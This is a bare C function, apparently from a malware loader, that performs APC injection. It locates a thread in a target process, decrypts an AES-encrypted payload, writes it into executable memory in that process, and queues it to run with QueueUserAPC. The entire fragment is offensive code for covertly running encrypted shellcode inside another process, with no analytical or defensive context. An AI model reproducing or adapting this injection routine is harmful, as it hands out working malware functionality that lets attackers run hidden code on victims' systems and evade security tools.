int InjectAPC(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;

    // Locate a thread in the target process
    hThread = FindThread(pid);
    if (hThread == NULL) {
        printf("Error: Thread hijacking unsuccessful.\n");
        return -1;
    }

    // Decrypt and prepare payload
    AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key)); 

    // Allocate memory in the target process and write the payload
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

    // Queue the shellcode for execution via APC
    QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
    
    return 0;
}
